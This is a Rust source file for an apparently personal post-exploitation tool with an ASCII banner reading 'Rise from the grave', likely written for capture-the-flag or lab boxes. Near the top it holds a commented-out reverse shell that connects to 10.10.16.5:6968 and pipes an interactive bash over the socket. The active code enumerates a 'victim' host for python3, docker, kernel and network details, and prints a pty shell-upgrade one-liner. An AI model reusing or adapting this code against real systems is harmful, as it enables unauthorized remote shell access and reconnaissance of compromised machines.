use rayon::prelude::*;
use std::fs::read_to_string;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Output, Stdio};

fn main() {
    //let sock = TcpStream::connect("10.10.16.5:6968").unwrap();
    //let fd = sock.as_raw_fd();

    //Command::new("bash")
    //    .arg("-i")
    //    .stdin(unsafe { Stdio::from_raw_fd(fd) })
    //    .stdout(unsafe { Stdio::from_raw_fd(fd) })
    //    .stderr(unsafe { Stdio::from_raw_fd(fd) })
    //    .spawn()
    //    .unwrap()
    //    .wait()
    //    .unwrap();
    println!(
        r"
    ██▀███   ██▓  ██████ ▓█████      █████▒██▀███   ▒█████   ███▄ ▄███▓   ▄▄▄█████▓ ██░ ██ ▓█████      ▄████  ██▀███   ▄▄▄    ██▒   █▓▓█████ 
    ▓██ ▒ ██▒▓██▒▒██    ▒ ▓█   ▀    ▓██   ▒▓██ ▒ ██▒▒██▒  ██▒▓██▒▀█▀ ██▒   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀     ██▒ ▀█▒▓██ ▒ ██▒▒████▄ ▓██░   █▒▓█   ▀ 
    ▓██ ░▄█ ▒▒██▒░ ▓██▄   ▒███      ▒████ ░▓██ ░▄█ ▒▒██░  ██▒▓██    ▓██░   ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄▓██  █▒░▒███   
    ▒██▀▀█▄  ░██░  ▒   ██▒▒▓█  ▄    ░▓█▒  ░▒██▀▀█▄  ▒██   ██░▒██    ▒██    ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██▒██ █░░▒▓█  ▄ 
    ░██▓ ▒██▒░██░▒██████▒▒░▒████▒   ░▒█░   ░██▓ ▒██▒░ ████▓▒░▒██▒   ░██▒     ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒▀█░  ░▒████▒
    ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░    ▒ ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ░  ░     ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░    ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▐░  ░░ ▒░ ░
      ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░ ░ ░  ░    ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░  ░      ░       ░     ▒ ░▒░ ░ ░ ░  ░     ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ░  ░
      ░░   ░  ▒ ░░  ░  ░     ░       ░ ░     ░░   ░ ░ ░ ░ ▒  ░      ░        ░       ░  ░░ ░   ░      ░ ░   ░   ░░   ░   ░   ▒     ░░     ░   
       ░      ░        ░     ░  ░             ░         ░ ░         ░                ░  ░  ░   ░  ░         ░    ░           ░  ░   ░     ░  ░
                                                                                                                                   ░          
    "
    );

    let enumerations =
        read_to_string("/home/zdroid/Documents/Programming/rftg/src/enums.txt").unwrap();
    enumerations.par_lines().into_par_iter().for_each(|enumeration| {
    match enumeration {
        "which python3" => {
            let output = Command::new("sh")
                .arg("-c")
                .arg(enumeration)
                .current_dir("/")
                .output();
            if output.is_ok() {
                println!("Victim has python! ........... Upgrade your shell with python3 -c 'import pty; pty.spawn('/bin/bash')'");
                //println!("{}", String::from_utf8_lossy(&output.unwrap().stdout))
            }
        }
        "docker" => {
            let has_docker = Command::new("sh")
                .arg("-c")
                .arg("docker")
                .output()
                .expect("No docker installed");
            if has_docker.status.success() {
                println!(
                    "Docker is installed {}",
                    String::from_utf8_lossy(&has_docker.stdout)
                );
            }
        }
        "sysinfo" => {
            let uname_a = Command::new("sh")
                .arg("-c")
                .arg("uname -a")
                .current_dir("/")
                .output()
                .expect("can't get Uname");
            print!(r"  _    _  ____   _____ _______   _____ _   _ ______ ____  
            | |  | |/ __ \ / ____|__   __| |_   _| \ | |  ____/ __ \ 
            | |__| | |  | | (___    | |      | | |  \| | |__ | |  | |
            |  __  | |  | |\___ \   | |      | | | . ` |  __|| |  | |
            | |  | | |__| |____) |  | |     _| |_| |\  | |   | |__| |
            |_|  |_|\____/|_____/   |_|    |_____|_| \_|_|    \____/ 
                                                                     
                                                                     ");
            println!(
                "Host Information -----------> {}",
                String::from_utf8_lossy(&uname_a.stdout)
            );

            let net = Command::new("sh")
                .arg("-c")
                .arg("ifconfig")
                .output().expect("failed to acquire ip");

            println!(
                    "IP Info -----------> {}",
                    String::from_utf8_lossy(&net.stdout)
                );
        }

        &_ => {}
    }
})
}
